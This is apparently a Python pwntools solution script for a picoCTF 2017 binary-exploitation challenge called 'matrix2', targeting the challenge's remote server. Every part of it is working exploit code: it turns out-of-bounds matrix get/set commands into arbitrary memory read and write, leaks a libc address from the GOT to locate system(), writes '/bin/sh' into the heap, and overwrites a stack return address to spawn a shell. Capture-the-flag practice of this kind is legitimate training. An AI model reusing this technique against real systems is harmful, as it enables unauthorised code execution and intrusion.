from pwn import *
import traceback


def run_cmd(cmd,after=True):
    r.recvuntil('Enter command: ',timeout=5)
    #print cmd
    r.send(cmd + '\n')
    if after:
        return r.recvline(timeout=5)
            

def get_hex(res):
    real = float(res.rsplit(' ',1)[1])
    return int(enhex(struct.pack('>f', real)),16)

def get_float(val):
    return struct.unpack('>f', unhex(hex(val)[2:].zfill(8)))[0]

def get_word(addr):
    a1 = addr / 4
    a2 = a1 // 10000
    a3 = a1 % 10000
    res = run_cmd('get 34 {} {}'.format(a2,a3))
    return get_hex(res)

def set_word(addr, val):
    if val & 0xff800000 == 0xff800000:
        print 'Could you not'
        return

    a1 = addr / 4
    a2 = a1 // 10000
    a3 = a1 % 10000
    right = get_float(val)
    res = run_cmd('set 34 {} {} {}'.format(a2,a3,right))

def set_word_e(addr, val, row=None):
    if val & 0xff800000 == 0xff800000:
        print 'Could you not'
        return

    offset = 0
    if row is None and addr & 0xff800000 == 0xff800000: # avoid NaN
        addr -= 0x00800000
        offset += 0x00800000 / 4

    if row:
        set_word(0x804b088, 1) # 1 col
        baddr = addr - row * 4
        print 'baddr = {}'.format(hex(baddr))
        set_word(0x804b08c, baddr)
        res = run_cmd('set 0 {} 0 {}'.format(row, get_float(val)))

    else:
        set_word(0x804b08c, addr)
        res = run_cmd('set 0 0 {} {}'.format(offset, get_float(val)))

def get_word_e(addr):
    offset = 0
    if addr & 0xff800000 == 0xff800000: # avoid NaN
        addr -= 0x00800000
        offset += 0x00800000 / 4 
    set_word(0x804b08c, addr)
    res = run_cmd('get 0 0 {}'.format(offset))
    return get_hex(res)

if __name__ == '__main__':
    while True:
        r = remote('shell2017.picoctf.com', 34094)
        #r = process('./matrix2', aslr=True)
        for _ in range(35):
            run_cmd('create 10000 10000')

        set_word(0x804b080, 0x804b084)
        set_word(0x804b084, 0x7f7fffff)
        set_word(0x804b088, 0x7f7fffff)

        try:
            print 'testing'
            res = get_word_e(0xffa05ffc)
            print('{}: {}'.format(hex(0xffa05688), hex(res)))
            search_range = 0x100
            for i in range(0xffa050c0, 0xffffffff, search_range):
                w = get_word_e(i)
                if w != 0:
                    break
                print('{}: {}'.format(hex(i), hex(get_word_e(i))))
            base = i - search_range
            for i in range(base + 11244, 0xffffffff, 4):
                w = get_word_e(i)
                if w == 0x08049068:
                    esp = i + 9*4
                    print('found esp: {}'.format(hex(i + 9*4)))
                    break

            heap_addr = get_word_e(0x804b090) # need to put /bin/sh
            print 'Putting /bin/sh at {}'.format(hex(heap_addr))
            set_word_e(heap_addr, 0x6e69622f) # /bin
            set_word_e(heap_addr + 4, 0x0068732f) # /sh\x00

            setbuf = get_word_e(0x804afc8)
            system = setbuf - 184176
            #print hex(get_word_e(system))
            real_esp = 228 + esp
            print 'esp of set: {}'.format(hex(real_esp))

            # custom set_word_e with /bin/sh as arg
            set_word_e(real_esp, system, heap_addr)

            r.interactive()


        except Exception, e:
            traceback.print_exc()
            r.close()
            continue

        r.close()
